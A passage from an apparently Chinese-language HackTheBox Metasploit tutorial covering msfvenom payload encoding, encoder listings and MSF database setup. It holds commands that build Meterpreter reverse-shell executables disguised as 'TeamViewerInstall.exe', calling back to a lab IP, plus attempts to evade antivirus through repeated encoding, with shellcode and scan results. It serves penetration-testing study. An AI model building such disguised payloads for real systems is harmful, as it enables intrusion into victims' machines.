class="line">&quot;\xcf\xa0\x82\x6e\x6a\x3a\x5e\x44\x58\x9c\xf2\xc3\xd6\xb9&quot; .</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<p>2015 年之后，这些脚本的更新已将它们合并到<code>msfvenom</code>工具中，该工具负责有效负载生成和编码。<code>msfvenom</code>后面我们会详细讲到。下面是今天的有效负载生成的示例<code>msfvenom</code>：</p>
<h4 id="生成有效载荷-无编码"><a href="#生成有效载荷-无编码" class="headerlink" title="生成有效载荷 - 无编码"></a>生成有效载荷 - 无编码</h4><p> 生成有效载荷 - 无编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b &quot;\x00&quot; -f perl</span><br><span class="line"></span><br><span class="line">Found 11 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 381 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 381</span><br><span class="line">Payload size: 381 bytes</span><br><span class="line">Final size of perl file: 1674 bytes</span><br><span class="line">my $buf = </span><br><span class="line">&quot;\xda\xc1\xba\x37\xc7\xcb\x5e\xd9\x74\x24\xf4\x5b\x2b\xc9&quot; .</span><br><span class="line">&quot;\xb1\x59\x83\xeb\xfc\x31\x53\x15\x03\x53\x15\xd5\x32\x37&quot; .</span><br><span class="line">&quot;\xb6\x96\xbd\xc8\x47\xc8\x8c\x1a\x23\x83\xbd\xaa\x27\xc1&quot; .</span><br><span class="line">&quot;\x4d\x42\xd2\x6e\x1f\x40\x2c\x8f\x2b\x1a\x66\x60\x9b\x91&quot; .</span><br><span class="line">&quot;\x50\x4f\x23\x89\xa1\xce\xdf\xd0\xf5\x30\xe1\x1a\x08\x31&quot; .</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<p>我们现在应该看一下的第一行<code>$buf</code>，看看它在应用像 . 这样的编码器时是如何变化的<code>shikata_ga_nai</code>。</p>
<h4 id="生成有效载荷-使用编码"><a href="#生成有效载荷-使用编码" class="headerlink" title="生成有效载荷 - 使用编码"></a>生成有效载荷 - 使用编码</h4><p> 生成有效载荷 - 使用编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b &quot;\x00&quot; -f perl -e x86/shikata_ga_nai</span><br><span class="line"></span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 3 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 326 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 353 (iteration=1)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 380 (iteration=2)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 380</span><br><span class="line">Payload size: 380 bytes</span><br><span class="line">buf = &quot;&quot;</span><br><span class="line">buf += &quot;\xbb\x78\xd0\x11\xe9\xda\xd8\xd9\x74\x24\xf4\x58\x31&quot;</span><br><span class="line">buf += &quot;\xc9\xb1\x59\x31\x58\x13\x83\xc0\x04\x03\x58\x77\x32&quot;</span><br><span class="line">buf += &quot;\xe4\x53\x15\x11\xea\xff\xc0\x91\x2c\x8b\xd6\xe9\x94&quot;</span><br><span class="line">buf += &quot;\x47\xdf\xa3\x79\x2b\x1c\xc7\x4c\x78\xb2\xcb\xfd\x6e&quot;</span><br><span class="line">buf += &quot;\xc2\x9d\x53\x59\xa6\x37\xc3\x57\x11\xc8\x77\x77\x9e&quot;</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<p>如果我们想查看<code>shikata_ga_nai</code>编码器的功能，我们可以查看<a target="_blank" rel="noopener" href="https://hatching.io/blog/metasploit-payloads2/">此处的</a>精彩帖子。</p>
<p>假设我们要为<code>existing payload</code>. 然后，我们可以使用<code>show encoders</code>中的命令<code>msfconsole</code>来查看哪些编码器可用于我们当前的<code>Exploit module + Payload</code>组合。</p>
<p> Shikata Ga Nai编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload 15</span><br><span class="line"></span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show encoders</span><br><span class="line"></span><br><span class="line">Compatible Encoders</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">   #  Name              Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----              ---------------  ----    -----  -----------</span><br><span class="line">   0  generic/eicar                      manual  No     The EICAR Encoder</span><br><span class="line">   1  generic/none                       manual  No     The &quot;none&quot; Encoder</span><br><span class="line">   2  x64/xor                            manual  No     XOR Encoder</span><br><span class="line">   3  x64/xor_dynamic                    manual  No     Dynamic key XOR Encoder</span><br><span class="line">   4  x64/zutto_dekiru                   manual  No     Zutto Dekiru</span><br></pre></td></tr></table></figure>

<p>在前面的例子中，我们只看到了一些适合 x64 系统的编码器。与可用的 payload 一样，这些都是根据 Exploit 模块自动过滤的，只显示兼容的。例如，让我们试试<code>MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference Exploit</code>.</p>
<p> Shikata Ga Nai编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(ms09_050_smb2_negotiate_func_index) &gt; show encoders</span><br><span class="line"></span><br><span class="line">Compatible Encoders</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">   Name                    Disclosure Date  Rank       Description</span><br><span class="line">   ----                    ---------------  ----       -----------</span><br><span class="line">   generic/none                             normal     The &quot;none&quot; Encoder</span><br><span class="line">   x86/alpha_mixed                          low        Alpha2 Alphanumeric Mixedcase Encoder</span><br><span class="line">   x86/alpha_upper                          low        Alpha2 Alphanumeric Uppercase Encoder</span><br><span class="line">   x86/avoid_utf8_tolower                   manual     Avoid UTF8/tolower</span><br><span class="line">   x86/call4_dword_xor                      normal     Call+4 Dword XOR Encoder</span><br><span class="line">   x86/context_cpuid                        manual     CPUID-based Context Keyed Payload Encoder</span><br><span class="line">   x86/context_stat                         manual     stat(2)-based Context Keyed Payload Encoder</span><br><span class="line">   x86/context_time                         manual     time(2)-based Context Keyed Payload Encoder</span><br><span class="line">   x86/countdown                            normal     Single-byte XOR Countdown Encoder</span><br><span class="line">   x86/fnstenv_mov                          normal     Variable-length Fnstenv/mov Dword XOR Encoder</span><br><span class="line">   x86/jmp_call_additive                    normal     Jump/Call XOR Additive Feedback Encoder</span><br><span class="line">   x86/nonalpha                             low        Non-Alpha Encoder</span><br><span class="line">   x86/nonupper                             low        Non-Upper Encoder</span><br><span class="line">   x86/shikata_ga_nai                       excellent  Polymorphic XOR Additive Feedback Encoder</span><br><span class="line">   x86/single_static_bit                    manual     Single Static Bit</span><br><span class="line">   x86/unicode_mixed                        manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder</span><br><span class="line">   x86/unicode_upper                        manual     Alpha2 Alphanumeric Unicode Uppercase Encoder</span><br></pre></td></tr></table></figure>

<p>就拿上面的例子来说吧——一个假设的例子。如果我们只使用 SGN 对可执行负载进行一次编码，那么它很可能会被当今的大多数防病毒软件检测到。让我们深入研究一下。拿起处理<code>msfvenom</code>有效载荷生成和编码方案的框架的下标，我们有以下输入：</p>
<p> Shikata Ga Nai编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe</span><br><span class="line"></span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 368 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 368</span><br><span class="line">Payload size: 368 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line">Saved as: TeamViewerInstall.exe</span><br></pre></td></tr></table></figure>

<p>这将生成一个<code>exe</code>格式为 TeamViewerInstall.exe 的有效负载，该格式适用于 Windows 平台的 x86 架构处理器，具有隐藏的 Meterpreter reverse_tcp shell 有效负载，使用 Shikata Ga Nai 方案编码一次。让我们把结果上传到 VirusTotal。</p>
<p>一个更好的选择是尝试通过相同编码方案的多次迭代来运行它：</p>
<p> Shikata Ga Nai编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe</span><br><span class="line"></span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 10 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 368 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 395 (iteration=1)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 422 (iteration=2)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 449 (iteration=3)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 476 (iteration=4)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 503 (iteration=5)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 530 (iteration=6)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 557 (iteration=7)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 584 (iteration=8)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 611 (iteration=9)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 611</span><br><span class="line">Payload size: 611 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line">Error: Permission denied @ rb_sysopen - /root/Desktop/TeamViewerInstall.exe</span><br></pre></td></tr></table></figure>

<p>正如我们所看到的，这仍然不足以进行 AV 规避。仍有大量产品可以检测有效负载。或者，Metasploit 提供了一个工具<code>msf-virustotal</code>，我们可以使用它和 API 密钥来分析我们的有效载荷。但是，这需要在 VirusTotal 上免费注册。</p>
<h4 id="无国界医生-VirusTotal"><a href="#无国界医生-VirusTotal" class="headerlink" title="无国界医生 - VirusTotal"></a>无国界医生 - VirusTotal</h4><p> 无国界医生 - VirusTotal</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msf-virustotal -k &lt;API key&gt; -f TeamViewerInstall.exe</span><br><span class="line"></span><br><span class="line">[*] Using API key: &lt;API key&gt;</span><br><span class="line">[*] Please wait while I upload TeamViewerInstall.exe...</span><br><span class="line">[*] VirusTotal: Scan request successfully queued, come back later for the report</span><br><span class="line">[*] Sample MD5 hash    : 4f54cc46e2f55be168cc6114b74a3130</span><br><span class="line">[*] Sample SHA1 hash   : 53fcb4ed92cf40247782de41877b178ef2a9c5a9</span><br><span class="line">[*] Sample SHA256 hash : 66894cbecf2d9a31220ef811a2ba65c06fdfecddbc729d006fdab10e43368da8</span><br><span class="line">[*] Analysis link: https://www.virustotal.com/gui/file/&lt;SNIP&gt;/detection/f-&lt;SNIP&gt;-1651750343</span><br><span class="line">[*] Requesting the report...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Analysis Report: TeamViewerInstall.exe (51 / 68): 66894cbecf2d9a31220ef811a2ba65c06fdfecddbc729d006fdab10e43368da8</span><br><span class="line">==================================================================================================================</span><br><span class="line"></span><br><span class="line"> Antivirus             Detected  Version                                                         Result                                                     Update</span><br><span class="line"> ---------             --------  -------                                                         ------                                                     ------</span><br><span class="line"> ALYac                 true      1.1.3.1                                                         Trojan.CryptZ.Gen                                          20220505</span><br><span class="line"> APEX                  true      6.288                                                           Malicious                                                  20220504</span><br><span class="line"> AVG                   true      21.1.5827.0                                                     Win32:SwPatch [Wrm]                                        20220505</span><br><span class="line"> Acronis               true      1.2.0.108                                                       suspicious                                                 20220426</span><br><span class="line"> Ad-Aware              true      3.0.21.193                                                      Trojan.CryptZ.Gen                                          20220505</span><br><span class="line"> AhnLab-V3             true      3.21.3.10230                                                    Trojan/Win32.Shell.R1283                                   20220505</span><br><span class="line"> Alibaba               false     0.3.0.5                                                                                                                    20190527</span><br><span class="line"> Antiy-AVL             false     3.0                                                                                                                        20220505</span><br><span class="line"> Arcabit               true      1.0.0.889                                                       Trojan.CryptZ.Gen                                          20220505</span><br><span class="line"> Avast                 true      21.1.5827.0                                                     Win32:SwPatch [Wrm]                                        20220505</span><br><span class="line"> Avira                 true      8.3.3.14                                                        TR/Patched.Gen2                                            20220505</span><br><span class="line"> Baidu                 false     1.0.0.2                                                                                                                    20190318</span><br><span class="line"> BitDefender           true      7.2                                                             Trojan.CryptZ.Gen                                          20220505</span><br><span class="line"> BitDefenderTheta      true      7.2.37796.0                                                     Gen:NN.ZexaF.34638.eq1@aC@Q!ici                            20220428</span><br><span class="line"> Bkav                  true      1.3.0.9899                                                      W32.FamVT.RorenNHc.Trojan                                  20220505</span><br><span class="line"> CAT-QuickHeal         true      14.00                                                           Trojan.Swrort.A                                            20220505</span><br><span class="line"> CMC                   false     2.10.2019.1                                                                                                                20211026</span><br><span class="line"> ClamAV                true      0.105.0.0                                                       Win.Trojan.MSShellcode-6360728-0                           20220505</span><br><span class="line"> Comodo                true      34592                                                           TrojWare.Win32.Rozena.A@4jwdqr                             20220505</span><br><span class="line"> CrowdStrike           true      1.0                                                             win/malicious_confidence_100% (D)                          20220418</span><br><span class="line"> Cylance               true      2.3.1.101                                                       Unsafe                                                     20220505</span><br><span class="line"> Cynet                 true      4.0.0.27                                                        Malicious (score: 100)                                     20220505</span><br><span class="line"> Cyren                 true      6.5.1.2                                                         W32/Swrort.A.gen!Eldorado                                  20220505</span><br><span class="line"> DrWeb                 true      7.0.56.4040                                                     Trojan.Swrort.1                                            20220505</span><br><span class="line"> ESET-NOD32            true      25218                                                           a variant of Win32/Rozena.AA                               20220505</span><br><span class="line"> Elastic               true      4.0.36                                                          malicious (high confidence)                                20220503</span><br><span class="line"> Emsisoft              true      2021.5.0.7597                                                   Trojan.CryptZ.Gen (B)                                      20220505</span><br><span class="line"> F-Secure              false     18.10.978-beta,1651672875v,1651675347h,1651717942c,1650632236t                                                             20220505</span><br><span class="line"> FireEye               true      35.24.1.0                                                       Generic.mg.4f54cc46e2f55be1                                20220505</span><br><span class="line"> Fortinet              true      6.2.142.0                                                       MalwThreat!0971IV                                          20220505</span><br><span class="line"> GData                 true      A:25.32960B:27.27244                                            Trojan.CryptZ.Gen                                          20220505</span><br><span class="line"> Gridinsoft            true      1.0.77.174                                                      Trojan.Win32.Swrort.zv!s2                                  20220505</span><br><span class="line"> Ikarus                true      6.0.24.0                                                        Trojan.Win32.Swrort                                        20220505</span><br><span class="line"> Jiangmin              false     16.0.100                                                                                                                   20220504</span><br><span class="line"> K7AntiVirus           true      12.10.42191                                                     Trojan ( 001172b51 )                                       20220505</span><br><span class="line"> K7GW                  true      12.10.42191                                                     Trojan ( 001172b51 )                                       20220505</span><br><span class="line"> Kaspersky             true      21.0.1.45                                                       HEUR:Trojan.Win32.Generic                                  20220505</span><br><span class="line"> Kingsoft              false     2017.9.26.565                                                                                                              20220505</span><br><span class="line"> Lionic                false     7.5                                                                                                                        20220505</span><br><span class="line"> MAX                   true      2019.9.16.1                                                     malware (ai score=89)                                      20220505</span><br><span class="line"> Malwarebytes          true      4.2.2.27                                                        Trojan.Rozena                                              20220505</span><br><span class="line"> MaxSecure             true      1.0.0.1                                                         Trojan.Malware.300983.susgen                               20220505</span><br><span class="line"> McAfee                true      6.0.6.653                                                       Swrort.i                                                   20220505</span><br><span class="line"> McAfee-GW-Edition     true      v2019.1.2+3728                                                  BehavesLike.Win32.Swrort.lh                                20220505</span><br><span class="line"> MicroWorld-eScan      true      14.0.409.0                                                      Trojan.CryptZ.Gen                                          20220505</span><br><span class="line"> Microsoft             true      1.1.19200.5                                                     Trojan:Win32/Meterpreter.A                                 20220505</span><br><span class="line"> NANO-Antivirus        true      1.0.146.25588                                                   Virus.Win32.Gen-Crypt.ccnc                                 20220505</span><br><span class="line"> Paloalto              false     0.9.0.1003                                                                                                                 20220505</span><br><span class="line"> Panda                 false     4.6.4.2                                                                                                                    20220504</span><br><span class="line"> Rising                true      25.0.0.27                                                       Trojan.Generic@AI.100 (RDMK:cmRtazqDtX58xtB5RYP2bMLR5Bv1)  20220505</span><br><span class="line"> SUPERAntiSpyware      true      5.6.0.1032                                                      Trojan.Backdoor-Shell                                      20220430</span><br><span class="line"> Sangfor               true      2.14.0.0                                                        Trojan.Win32.Save.a                                        20220415</span><br><span class="line"> SentinelOne           true      22.2.1.2                                                        Static AI - Malicious PE                                   20220330</span><br><span class="line"> Sophos                true      1.4.1.0                                                         ML/PE-A + Mal/EncPk-ACE                                    20220505</span><br><span class="line"> Symantec              true      1.17.0.0                                                        Packed.Generic.347                                         20220505</span><br><span class="line"> TACHYON               false     2022-05-05.02                                                                                                              20220505</span><br><span class="line"> Tencent               true      1.0.0.1                                                         Trojan.Win32.Cryptz.za                                     20220505</span><br><span class="line"> TrendMicro            true      11.0.0.1006                                                     BKDR_SWRORT.SM                                             20220505</span><br><span class="line"> TrendMicro-HouseCall  true      10.0.0.1040                                                     BKDR_SWRORT.SM                                             20220505</span><br><span class="line"> VBA32                 false     5.0.0                                                                                                                      20220505</span><br><span class="line"> ViRobot               true      2014.3.20.0                                                     Trojan.Win32.Elzob.Gen                                     20220504</span><br><span class="line"> VirIT                 false     9.5.188                                                                                                                    20220504</span><br><span class="line"> Webroot               false     1.0.0.403                                                                                                                  20220505</span><br><span class="line"> Yandex                true      5.5.2.24                                                        Trojan.Rosena.Gen.1                                        20220428</span><br><span class="line"> Zillya                false     2.0.0.4625                                                                                                                 20220505</span><br><span class="line"> ZoneAlarm             true      1.0                                                             HEUR:Trojan.Win32.Generic                                  20220505</span><br><span class="line"> Zoner                 false     2.2.2.0                                                                                                                    20220504</span><br><span class="line"> tehtris               false     v0.1.2                                                                                                                     20220505</span><br></pre></td></tr></table></figure>

<p>正如预期的那样，我们在野外遇到的大多数反病毒产品仍会检测到此有效负载，因此我们将不得不使用本模块范围之外的其他方法来规避 AV。</p>
<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><hr>
<p><code>Databases</code>in<code>msfconsole</code>用于跟踪您的结果。毫无疑问，在更复杂的机器评估期间，更不用说整个网络了，由于搜索结果、入口点、检测到的问题、发现的凭据等的绝对数量，事情会变得有点模糊和复杂。</p>
<p>这就是数据库发挥作用的地方。<code>Msfconsole</code>内置了对 PostgreSQL 数据库系统的支持。有了它，我们可以直接、快速、轻松地访问扫描结果，并增加了与第三方工具一起导入和导出结果的能力。数据库条目也可用于直接使用现有的调查结果配置漏洞利用模块参数。</p>
<hr>
<h2 id="设置数据库"><a href="#设置数据库" class="headerlink" title="设置数据库"></a>设置数据库</h2><p>首先，我们必须确保 PostgreSQL 服务器在我们的主机上启动并运行。为此，请输入以下命令：</p>
<h4 id="PostgreSQL-状态"><a href="#PostgreSQL-状态" class="headerlink" title="PostgreSQL 状态"></a>PostgreSQL 状态</h4><p> PostgreSQL 状态</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo service postgresql status</span><br><span class="line"></span><br><span class="line">● postgresql.service - PostgreSQL RDBMS</span><br><span class="line">     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)</span><br><span class="line">     Active: active (exited) since Fri 2022-05-06 14:51:30 BST; 3min 51s ago</span><br><span class="line">    Process: 2147 ExecStart=/bin/true (code=exited, status=0/SUCCESS)</span><br><span class="line">   Main PID: 2147 (code=exited, status=0/SUCCESS)</span><br><span class="line">        CPU: 1ms</span><br><span class="line"></span><br><span class="line">May 06 14:51:30 pwnbox-base systemd[1]: Starting PostgreSQL RDBMS...</span><br><span class="line">May 06 14:51:30 pwnbox-base systemd[1]: Finished PostgreSQL RDBMS.</span><br></pre></td></tr></table></figure>

<h4 id="启动-PostgreSQL"><a href="#启动-PostgreSQL" class="headerlink" title="启动 PostgreSQL"></a>启动 PostgreSQL</h4><p> 启动 PostgreSQL</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo systemctl start postgresql</span><br></pre></td></tr></table></figure>

<p>启动 PostgreSQL 后，我们需要创建并初始化 MSF 数据库<code>msfdb init</code>。</p>
<h4 id="MSF-启动数据库"><a href="#MSF-启动数据库" class="headerlink" title="MSF - 启动数据库"></a>MSF - 启动数据库</h4><p> MSF - 启动数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo msfdb init</span><br><span class="line"></span><br><span class="line">[i] Database already started</span><br><span class="line">[+] Creating database user &#x27;msf&#x27;</span><br><span class="line">[+] Creating databases &#x27;msf&#x27;</span><br><span class="line">[+] Creating databases &#x27;msf_test&#x27;</span><br><span class="line">[+] Creating configuration file &#x27;/usr/share/metasploit-framework/config/database.yml&#x27;</span><br><span class="line">[+] Creating initial database schema</span><br><span class="line">rake aborted!</span><br><span class="line">NoMethodError: undefined method `without&#x27; for #&lt;Bundler::Settings:0x000055dddcf8cba8&gt;</span><br><span class="line">Did you mean? with_options</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<p>如果 Metasploit 不是最新的，有时会发生错误。这种导致错误的差异可能有多种原因。首先，通常它有助于再次更新 Metasploit ( <code>apt update</code>) 来解决这个问题。然后我们可以尝试重新初始化 MSF 数据库。</p>
<p> MSF - 启动数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo msfdb init</span><br><span class="line"></span><br><span class="line">[i] Database already started</span><br><span class="line">[i] The database appears to be already configured, skipping initialization</span><br></pre></td></tr></table></figure>

<p>如果初始化被跳过并且 Metasploit 告诉我们数据库已经配置好，我们可以重新检查数据库的状态。</p>
<p> MSF - 启动数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo msfdb status</span><br><span class="line"></span><br><span class="line">● postgresql.service - PostgreSQL RDBMS</span><br><span class="line">     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)</span><br><span class="line">     Active: active (exited) since Mon 2022-05-09 15:19:57 BST; 35min ago</span><br><span class="line">    Process: 2476 ExecStart=/bin/true (code=exited, status=0/SUCCESS)</span><br><span class="line">   Main PID: 2476 (code=exited, status=0/SUCCESS)</span><br><span class="line">        CPU: 1ms</span><br><span class="line"></span><br><span class="line">May 09 15:19:57 pwnbox-base systemd[1]: Starting PostgreSQL RDBMS...</span><br><span class="line">May 09 15:19:57 pwnbox-base systemd[1]: Finished PostgreSQL RDBMS.</span><br><span class="line"></span><br><span class="line">COMMAND   PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span><br><span class="line">postgres 2458 postgres    5u  IPv6  34336      0t0  TCP localhost:5432 (LISTEN)</span><br><span class="line">postgres 2458 postgres    6u  IPv4  34337      0t0  TCP localhost:5432 (LISTEN)</span><br><span class="line"></span><br><span class="line">UID          PID    PPID  C STIME TTY      STAT   TIME CMD</span><br><span class="line">postgres    2458       1  0 15:19 ?        Ss     0:00 